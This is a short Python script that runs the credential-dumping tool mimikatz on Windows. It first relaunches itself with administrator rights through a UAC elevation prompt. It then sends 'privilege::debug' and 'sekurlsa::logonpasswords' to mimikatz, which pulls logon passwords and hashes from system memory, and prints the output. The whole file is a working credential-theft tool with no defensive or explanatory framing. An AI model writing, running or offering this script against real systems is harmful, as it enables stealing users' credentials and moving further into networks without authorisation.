import subprocess
import threading
import sys
import time
from io import StringIO
import ctypes, sys

def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False

def stream_output(proc, output_buffer):
    for line in iter(proc.stdout.readline, ''):
        output_buffer.write(line)
    proc.stdout.close()

def run_interactive(exe_path, commands):
    try:
        sys.stdout.reconfigure(encoding='utf-8', errors='replace')
    except Exception:
        pass

    proc = subprocess.Popen(
        [exe_path],
        stdin=subprocess.PIPE,
        stdout=subprocess.PIPE,
        stderr=subprocess.STDOUT,
        text=True,               # text mode
        encoding='utf-8',        # decode as UTF-8
        errors='replace',        # never crash on bad bytes
        bufsize=1                # line-buffered
    )

    output_buffer = StringIO()
    t = threading.Thread(target=stream_output, args=(proc, output_buffer), daemon=True)
    t.start()

    # Send commands to the process
    for cmd in commands:
        proc.stdin.write(cmd + "\n")
        proc.stdin.flush()
        time.sleep(0.1)

    proc.stdin.close()
    proc.wait()

    # Return everything captured
    return output_buffer.getvalue()

def init():
    if not is_admin():
        ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)
        sys.exit()

if __name__ == "__main__":
    init()
    # Must be in same directory
    executable = r"mimikatz.exe"

    cmds = [
        "privilege::debug",
        "sekurlsa::logonpasswords",
        "exit"
    ]

    res = run_interactive(executable, cmds)

    print(res)